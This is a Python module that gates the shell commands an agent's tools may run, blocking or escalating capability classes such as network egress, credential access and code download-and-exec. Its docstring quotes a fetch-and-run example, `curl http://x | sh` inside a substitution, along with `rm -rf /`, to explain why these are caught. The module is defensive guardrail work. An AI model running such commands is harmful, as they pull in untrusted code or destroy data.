"""shell_admission.py -- capability-typed admission for shell-executing tools.

A superior alternative to a flat denied-token regex. Three things a regex over
the raw command string cannot do, and this does (the parsing lives in
shell_parse.py; this module turns its findings into a decision):

  1. QUOTE AWARENESS. `echo "rm -rf /"` is a print, not a delete.
  2. SUBSTITUTION DESCENT. `echo $(curl http://x | sh)` runs curl and sh even
     though the outer word is `echo`.
  3. CAPABILITY TYPING. The decision names a capability class, not a matched
     keyword, so it composes with the capability-typed receipt.

Fail closed: a command that cannot be parsed is not admitted (ESCALATE).

Trace hygiene, same contract as policy.py: the decision carries a capability
class, a reason code, and an args_hash, never the raw command, paths, or secrets.

Honest nulls. The capability map (in shell_parse.py) is curated, not exhaustive;
an unknown executable is UNKNOWN and admitted by default so the oracle can run
pytest, while still being recorded. Dangerous capability CLASSES are denied by
default wherever they appear, including inside a substitution.
"""
from __future__ import annotations

import hashlib
from dataclasses import dataclass, field

from .policy import Decision, PolicyLayer, PolicyResult, ToolCapabilityPolicy, args_hash
from .receipt_fields import canonical
from .shell_parse import (AdmissionError, Capability, Finding,  # re-exported
                          walk_findings)

__all__ = ["Capability", "Finding", "AdmissionDecision", "ShellAdmissionPolicy",
           "classify_command", "capability_typed_gate", "DENY_BY_DEFAULT",
           "ESCALATE_BY_DEFAULT"]

# Capability classes denied by default wherever they appear in the command tree.
DENY_BY_DEFAULT = frozenset({
    Capability.NETWORK_EGRESS, Capability.DESTRUCTIVE_FS,
    Capability.CREDENTIAL_ACCESS, Capability.PRIVILEGE_ESCALATION,
    Capability.DEVICE_WRITE, Capability.CODE_DOWNLOAD_EXEC,
    Capability.PACKAGE_PUBLISH, Capability.PROCESS_CONTROL,
})
# Classes that warrant a human rather than an outright block.
ESCALATE_BY_DEFAULT = frozenset({Capability.HISTORY_TAMPER})


@dataclass
class AdmissionDecision:
    decision: Decision
    reason_code: str
    capability: Capability
    findings: list[Finding] = field(default_factory=list)

    @property
    def allowed(self) -> bool:
        return self.decision == Decision.ALLOW

    def findings_digest(self) -> str:
        payload = canonical(sorted((f.to_dict() for f in self.findings),
                                   key=lambda d: (d["depth"], d["capability"],
                                                  d["executable"])))
        return hashlib.sha256(payload.encode()).hexdigest()[:16]


def classify_command(cmd: str, *,
                     deny: frozenset[Capability] = DENY_BY_DEFAULT,
                     escalate: frozenset[Capability] = ESCALATE_BY_DEFAULT
                     ) -> AdmissionDecision:
    """Classify a shell command into a typed admission decision.

    A dangerous capability found anywhere in the command tree (including inside a
    substitution) decides the call. Parse failure fails closed (ESCALATE).
    """
    try:
        findings = walk_findings(cmd)
    except AdmissionError:
        return AdmissionDecision(Decision.ESCALATE,
                                 "unparseable_command_fail_closed",
                                 Capability.UNKNOWN, [])
    for f in findings:
        if f.capability in deny:
            return AdmissionDecision(
                Decision.BLOCK, f"denied_capability:{f.capability.value}",
                f.capability, findings)
    for f in findings:
        if f.capability in escalate:
            return AdmissionDecision(
                Decision.ESCALATE, f"escalate_capability:{f.capability.value}",
                f.capability, findings)
    top = next((f.capability for f in findings
                if f.capability != Capability.UNKNOWN), Capability.UNKNOWN)
    return AdmissionDecision(Decision.ALLOW, "no_dangerous_capability", top,
                             findings)


class ShellAdmissionPolicy:
    """Call-level PolicyLayer: a capability-typed replacement for CallShellPolicy.

    Drops into policy.gate([...]) in place of CallShellPolicy. Carries capability
    class + args_hash in the trace, never the raw command.
    """
    boundary = "call"

    def __init__(self, tool_name: str = "oracle.run", arg_key: str = "cmd",
                 deny: frozenset[Capability] = DENY_BY_DEFAULT,
                 escalate: frozenset[Capability] = ESCALATE_BY_DEFAULT,
                 policy_id: str = "shell-admission-v1"):
        self.tool_name = tool_name
        self.arg_key = arg_key
        self.deny = deny
        self.escalate = escalate
        self.policy_id = policy_id

    def decide(self, tool: str, args: dict, ctx: dict) -> PolicyResult | None:
        if tool != self.tool_name:
            return None
        cmd = str(args.get(self.arg_key, ""))
        d = classify_command(cmd, deny=self.deny, escalate=self.escalate)
        if d.decision == Decision.ALLOW:
            return None
        return PolicyResult(
            d.decision, "call", self.policy_id, d.reason_code, args_hash(args),
            evidence_ref=d.findings_digest(),
            note=(f"command requires capability {d.capability.value}; "
                  "no side effect occurred"))


def capability_typed_gate(allowed_tools: list[str],
                          deny: frozenset[Capability] = DENY_BY_DEFAULT,
                          escalate: frozenset[Capability] = ESCALATE_BY_DEFAULT
                          ) -> list[PolicyLayer]:
    """The capability-typed admission stack: tool-capability shape, then the
    quote-aware, substitution-descending shell classifier. A drop-in superior
    replacement for policy.default_harness_gate that reasons over the command
    tree rather than a denied-token list."""
    return [ToolCapabilityPolicy(allowed_tools), ShellAdmissionPolicy(
        deny=deny, escalate=escalate)]
